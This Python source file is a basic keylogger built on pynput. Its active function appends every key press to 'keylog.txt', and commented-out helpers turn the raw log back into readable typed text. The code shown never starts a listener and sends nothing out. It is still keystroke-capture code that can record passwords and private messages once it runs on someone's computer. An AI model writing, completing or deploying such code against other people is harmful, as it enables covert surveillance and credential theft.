from pynput import keyboard
import time

# def process_keylog(keylog):
#     input_text = ""
#     is_shifted = False

#     for event in keylog.split("Key."):
#         event = event.strip()
#         if event.startswith("shift_"):
#             is_shifted = not is_shifted
#         elif event.startswith("space"):
#             input_text += " "
#         elif event.startswith("backspace"):
#             input_text = input_text[:-1]
#         else:
#             # Handle letters and other characters
#             if len(event) == 1:
#                 # Regular character
#                 input_text += event if not is_shifted else event.upper()
#             else:
#                 # Special keys like tab, enter, etc. (you can extend this)
#                 special_keys = {
#                     "tab": "\t",
#                     "enter": "\n",
#                     "lshift": "",  # Ignore left shift key
#                     "rshift": "",  # Ignore right shift key
#                 }
#                 input_text += special_keys.get(event, "")

#     return input_text

# def convert_keylog(keylog):
#     input_text = ""
#     key_buffer = []

#     for line in keylog.split('\n'):
#         if line.startswith("Key released:"):
#             parts = line.split(":")
#             if len(parts) >= 2:
#                 key_event = parts[1].strip()
#                 if key_event == "Key.backspace":
#                     if key_buffer:
#                         key_buffer.pop()
#                 elif key_event.startswith("'") and len(key_event) == 3:
#                     key_buffer.append(key_event[1])
#                 elif key_event == "Key.space":
#                     key_buffer.append(" ")
#         elif key_buffer:
#             input_text += "".join(key_buffer)
#             key_buffer.clear()

#     return input_text


# Function to handle key press events and save them to a file with UTF-8 encoding
def on_key_event(key, is_press=True):
    try:
        if is_press:
        #     with open("keylogFinal.txt", "a", encoding='utf-8') as f:
        #         char = key.char if hasattr(key, 'char') else str(key)
        #         f.write(char)
        # else:
            with open("keylog.txt", "a", encoding='utf-8') as f:
                f.write('Key pressed: {0}\n'.format(key))
    except AttributeError:
        pass  # Handle special keys gracefully
    # process_and_replace_text_file("keylog.txt")

# def process_and_replace_text_file(file_path):
#     # Read the content of the text file
#     with open(file_path, 'r') as file:
#         text_content = file.read()

#     # Process the keylog content
#     processed_content = convert_keylog(text_content)
#     # Replace the old content with the processed content
#     with open("keylogFinal.txt", 'a') as file:
#         file.write(processed_content)